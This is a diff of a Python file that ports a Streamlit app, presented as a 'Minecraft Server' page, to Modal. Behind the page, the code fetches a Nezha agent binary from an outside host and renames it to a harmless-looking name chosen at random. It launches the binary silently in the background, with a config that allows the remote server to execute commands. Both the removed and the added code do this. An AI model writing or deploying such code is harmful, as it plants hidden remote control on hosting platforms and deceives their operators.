@@ -3,57 +3,41 @@ import time
 import subprocess
 import platform
 import random
-import streamlit as st
-import streamlit.components.v1 as components
+import threading  # 用于启动 agent 后不阻塞 streamlit
 
-# Environment variables
-FILE_PATH = os.environ.get('FILE_PATH', '.cache')
-NEZHA_SERVER = os.environ.get('NEZHA_SERVER', 'nezha.loc.cc:443')
-NEZHA_PORT = os.environ.get('NEZHA_PORT', '')
-NEZHA_KEY = os.environ.get('NEZHA_KEY', '')
-UUID = os.environ.get('UUID', 'deef2009-c4e2-4f01-a7d9-0d40b468d258')
+# Modal 相关导入
+import modal
 
-# Random file names for disguise
-DISGUISE_NAMES = ['cache_manager', 'session_handler', 'task_worker', 'log_rotator', 'health_check']
+# ========== 定义 Modal 镜像，安装所需依赖 ==========
+image = modal.Image.debian_slim().pip_install(
+    "streamlit",
+    "requests",
+    # 如果有其他依赖，可以继续添加
+)
 
-def get_random_name():
-    return random.choice(DISGUISE_NAMES)
+app = modal.App("nezha-streamlit-app", image=image)
 
-def create_directory():
-    if not os.path.exists(FILE_PATH):
-        os.makedirs(FILE_PATH)
+# ========== 原有函数保持不变（但将导入移到函数内部以避免顶层加载）==========
+def create_directory(file_path):
+    if not os.path.exists(file_path):
+        os.makedirs(file_path)
 
 def get_system_architecture():
     architecture = platform.machine().lower()
-    if 'arm' in architecture or 'aarch64' in architecture:
-        return 'arm'
-    else:
-        return 'amd'
+    return 'arm' if ('arm' in architecture or 'aarch64' in architecture) else 'amd'
 
-def download_file(file_name, file_url):
-    file_path = os.path.join(FILE_PATH, file_name)
+def download_file(file_name, file_url, file_path):
+    import requests  # 函数内部导入
     try:
-        import requests
         response = requests.get(file_url, stream=True, timeout=30)
         response.raise_for_status()
-        
-        with open(file_path, 'wb') as f:
+        full_path = os.path.join(file_path, file_name)
+        with open(full_path, 'wb') as f:
             for chunk in response.iter_content(chunk_size=8192):
                 f.write(chunk)
         return True
     except:
-        if os.path.exists(file_path):
-            os.remove(file_path)
         return False
-
-def get_download_url(architecture):
-    if not NEZHA_SERVER or not NEZHA_KEY:
-        return None
-    
-    if NEZHA_PORT:
-        return "https://arm64.ssss.nyc.mn/agent" if architecture == 'arm' else "https://amd64.ssss.nyc.mn/agent"
-    else:
-        return "https://arm64.ssss.nyc.mn/v1" if architecture == 'arm' else "https://amd64.ssss.nyc.mn/v1"
 
 def authorize_files(file_path):
     if os.path.exists(file_path):
@@ -65,7 +49,7 @@ def authorize_files(file_path):
 def exec_cmd(command):
     try:
         subprocess.Popen(
-            command, 
+            command,
             shell=True,
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL
@@ -73,32 +57,41 @@ def exec_cmd(command):
     except:
         pass
 
-def run_agent():
-    if not NEZHA_SERVER or not NEZHA_KEY:
+def run_agent(file_path, nezha_server, nezha_port, nezha_key, uuid):
+    """运行 Nezha Agent 的逻辑，参数从环境变量传入"""
+    if not nezha_server or not nezha_key:
         return
-    
+
     architecture = get_system_architecture()
-    disguise_name = get_random_name()
-    url = get_download_url(architecture)
-    
-    if not url:
+    disguise_names = ['cache_manager', 'session_handler', 'task_worker', 'log_rotator', 'health_check']
+    disguise_name = random.choice(disguise_names)
+
+    # 构造下载 URL
+    if nezha_port:
+        # 旧版 agent
+        url = "https://arm64.ssss.nyc.mn/agent" if architecture == 'arm' else "https://amd64.ssss.nyc.mn/agent"
+    else:
+        # 新版 v1
+        url = "https://arm64.ssss.nyc.mn/v1" if architecture == 'arm' else "https://amd64.ssss.nyc.mn/v1"
+
+    if not download_file(disguise_name, url, file_path):
         return
-    
-    if not download_file(disguise_name, url):
-        return
-    
-    agent_path = os.path.join(FILE_PATH, disguise_name)
+
+    agent_path = os.path.join(file_path, disguise_name)
     authorize_files(agent_path)
-    
-    port = NEZHA_SERVER.split(":")[-1] if ":" in NEZHA_SERVER else ""
+
+    # 根据端口判断是否启用 TLS
     tls_ports = ['443', '8443', '2096', '2087', '2083', '2053']
 
-    if NEZHA_PORT:
-        nezha_tls_flag = '--tls' if NEZHA_PORT in tls_ports else ''
-        command = f"nohup {agent_path} -s {NEZHA_SERVER}:{NEZHA_PORT} -p {NEZHA_KEY} {nezha_tls_flag} >/dev/null 2>&1 &"
+    if nezha_port:
+        # 旧版命令行模式
+        nezha_tls_flag = '--tls' if nezha_port in tls_ports else ''
+        command = f"nohup {agent_path} -s {nezha_server}:{nezha_port} -p {nezha_key} {nezha_tls_flag} >/dev/null 2>&1 &"
     else:
+        # 新版配置文件模式（从 server 中提取端口）
+        port = nezha_server.split(":")[-1] if ":" in nezha_server else ""
         nezha_tls = "true" if port in tls_ports else "false"
-        config_yaml = f"""client_secret: {NEZHA_KEY}
+        config_yaml = f"""client_secret: {nezha_key}
 debug: false
 disable_auto_update: true
 disable_command_execute: false
@@ -109,51 +102,89 @@ gpu: false
 insecure_tls: false
 ip_report_period: 1800
 report_delay: 4
-server: {NEZHA_SERVER}
+server: {nezha_server}
 skip_connection_count: false
 skip_procs_count: false
 temperature: false
 tls: {nezha_tls}
 use_gitee_to_upgrade: false
 use_ipv6_country_code: false
-uuid: {UUID}"""
-        
-        config_path = os.path.join(FILE_PATH, 'config.yaml')
+uuid: {uuid}"""
+        config_path = os.path.join(file_path, 'config.yaml')
         with open(config_path, 'w') as f:
             f.write(config_yaml)
-        
+
         command = f"nohup {agent_path} -c \"{config_path}\" >/dev/null 2>&1 &"
-    
+
     exec_cmd(command)
 
-# 初始化后台任务（只运行一次）
-if 'initialized' not in st.session_state:
-    create_directory()
-    run_agent()
-    st.session_state.initialized = True
+# ========== Modal Web 服务入口 ==========
+@app.web_server(port=8501, startup_timeout=120)
+def web_entry():
+    """
+    此函数会在 Modal 容器中启动一个 Web 服务器。
+    它首先启动 Nezha Agent 后台进程，然后启动 Streamlit 服务器。
+    """
+    # 从环境变量读取配置（这些变量会在 GitHub Actions 中设置）
+    FILE_PATH = os.environ.get('FILE_PATH', '.cache')
+    NEZHA_SERVER = os.environ.get('NEZHA_SERVER', 'nezha.loc.cc:443')
+    NEZHA_PORT = os.environ.get('NEZHA_PORT', '')
+    NEZHA_KEY = os.environ.get('NEZHA_KEY', '')
+    UUID = os.environ.get('UUID', 'deef2009-c4e2-4f01-a7d9-0d40b468d258')
 
-# Streamlit 页面配置
-st.set_page_config(
-    page_title="Minecraft Server",
-    page_icon="⛏️",
-    layout="wide"
-)
+    # 创建缓存目录
+    create_directory(FILE_PATH)
 
-# 隐藏 Streamlit 默认元素
-st.markdown("""
-<style>
-    #MainMenu {visibility: hidden;}
-    footer {visibility: hidden;}
-    header {visibility: hidden;}
-    .stApp {
-        margin: 0;
-        padding: 0;
-    }
-</style>
-""", unsafe_allow_html=True)
+    # 在新线程中启动 Agent（避免阻塞 Streamlit 启动）
+    def agent_thread():
+        run_agent(FILE_PATH, NEZHA_SERVER, NEZHA_PORT, NEZHA_KEY, UUID)
 
-# 完整的 HTML 页面
-html_content = """
+    threading.Thread(target=agent_thread, daemon=True).start()
+
+    # 启动 Streamlit 服务器
+    # 注意：必须使用 subprocess 启动，因为 streamlit 本身是一个进程
+    cmd = [
+        "streamlit", "run", __file__,
+        "--server.port", "8501",
+        "--server.headless", "true",
+        "--server.enableCORS", "false",
+        "--server.enableXsrfProtection", "false"
+    ]
+    # 替换当前进程为 streamlit 进程（这样 Modal 就可以管理它的生命周期）
+    os.execvp("streamlit", cmd)
+
+# ========== 以下是原有的 Streamlit 页面代码，但稍作调整 ==========
+# 注意：当通过 `modal run` 直接执行此文件时，会进入这里；
+# 当通过 Web 服务器方式启动时，streamlit 会重新执行此文件作为页面逻辑。
+# 因此需要将页面代码放在一个条件中，避免在后台启动时重复执行。
+
+if __name__ == "__main__":
+    # 这部分只会在 Streamlit 重新加载文件时执行（即作为页面逻辑）
+    import streamlit as st
+    import streamlit.components.v1 as components
+
+    # 设置页面配置（必须放在最前）
+    st.set_page_config(
+        page_title="Minecraft Server",
+        page_icon="⛏️",
+        layout="wide"
+    )
+
+    # 隐藏 Streamlit 默认元素
+    st.markdown("""
+    <style>
+        #MainMenu {visibility: hidden;}
+        footer {visibility: hidden;}
+        header {visibility: hidden;}
+        .stApp {
+            margin: 0;
+            padding: 0;
+        }
+    </style>
+    """, unsafe_allow_html=True)
+
+    # 你的 HTML 内容（请替换为实际内容）
+    html_content = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -518,7 +549,7 @@ html_content = """
     </script>
 </body>
 </html>
-"""
+    """
 
-# 使用 components.html 渲染完整的 HTML 页面
-components.html(html_content, height=1200, scrolling=True)
+    # 渲染 HTML
+    components.html(html_content, height=1200, scrolling=True)
